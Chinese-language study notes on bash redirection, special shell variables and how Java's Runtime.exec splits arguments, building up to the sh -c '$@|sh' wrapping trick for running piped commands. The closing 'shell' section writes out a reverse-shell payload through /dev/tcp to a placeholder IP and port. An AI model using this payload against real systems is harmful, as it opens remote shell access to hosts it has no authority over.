## bash基础

### 重定向

* `>`  重定向到文件
* `>&`  重定向到文件描述符
* &>file  `1>file 2>file`或 `>file 2>&1`
* `>>`   以追加方式重定向

```bash
2>1     #stderr重定向到当前文件夹的1文件
2>&1    #stderr重定向到stdout
&> file #stderr和stdout重定向到file
1>file 2>file  #同上
>file 2>&1  #同上
```

其中

```bash
ls xxx > file 2>&1
```

其实是这样工作的

```
stdin --->  ls xxx  -----------------> stdout ---> file
                   |---> stderr --^
```

`>>`不存在`>>&`的用法，因此如果想以追加方式输入file，应该

```bash
ls xxx >> file 2>&1
```

### sh

#### sh -c

```
sh -c "command"
```

```
sh -c 'command'  x1 x2 x3
```

x1是脚本名称，x2 x3是参数

### 特殊变量

* `$0`  脚本文件名
* `$1~$n`  第1~n个参数
* `$@`  参数列表，若调用`"$@"`，则返回`"$1 $2 ... $n"`
* `$*`  参数列表，若调用`"$*"`，则返回`"$1" "$2" ... "$n"`
* `$#`  参数个数
* `$$`  shell的pid
* `$!`  shell最后运行的process的pid
* `$?`  最后运行的process的结束代码
* `$-`  使用set命令设定的flag

## java

### java Runtime.exec

https://www.anquanke.com/post/id/159554   文章

http://jackson-t.ca/runtime-exec-payloads.html  payload测试

#### Runtime.exec

```java
public Process exec(String command) throws IOException;
public Process exec(String[] cmdarray) throws IOException;
public Process exec(String[] cmdarray, String[] envp) throws IOException;
public Process exec(String[] cmdarray, String[] envp, File dir) throws IOException;
public Process exec(String command, String[] envp) throws IOException;
public Process exec(String command, String[] envp, File dir) throws IOException;
```

作用依次如下

* 在单独的进程中执行指定的字符串命令
* 在单独的进程中执行指定命令和变量
* 在指定环境和工作目录的独立进程中执行指定的命令和变量
* 在指定环境的单独进程中执行指定的字符串命令
* 在指定环境和工作目录的独立进程中执行指定的字符串命令

#### exec(String command)

直接一个进程执行command字符串的命令

此时若有以下两条指令

```bash
ls -l \opt
ls -l \opt | grep xx
```

执行结果一样，因为`|`只有在shell环境下才能被识别，而fork不能识别。类似的情况出现于`< >`等重定向指令

##### exec的处理

exec根据空格区分参数，因此刚刚第二条指令相当于用参数`-l` `\opt` `|` `grep` `xx` 调用exec

##### 使用sh -c

试图使用

```bash
sh -c "ls -l \opt | grep xx"
```

但因为exec用空格处理参数，因此`""`不会被shell整体接收，而是当做不同的参数

```bash
sh -c ls -l \opt | grep xx
```

显然不行，因为 sh -c 使用空格区分不同命令，此种做法相当于只执行了ls命令

##### 使用 `$@|sh`

sh有一种使用方法，注意这里`''`是必须的

```bash
sh -c 'command'  x1 x2 x3
```

x1是脚本名称，x2 x3是参数

则有如下用法

```bash
sh -c '$@|sh' xx echo ls -l /opt | grep xx
```

这里注意

* $@   参数整体，以空格分离
* $#   参数个数

所以相当于执行

```bash
sh -c 'echo "ls -l /opt | grep xx" | sh'
```

等价于

```bash
echo "ls -l /opt | grep xx" | sh
```

#### shell

```bash
sh -c '$@|sh' xx echo sh -i >& /dev/tcp/(ip)/(port) 0>&1
```

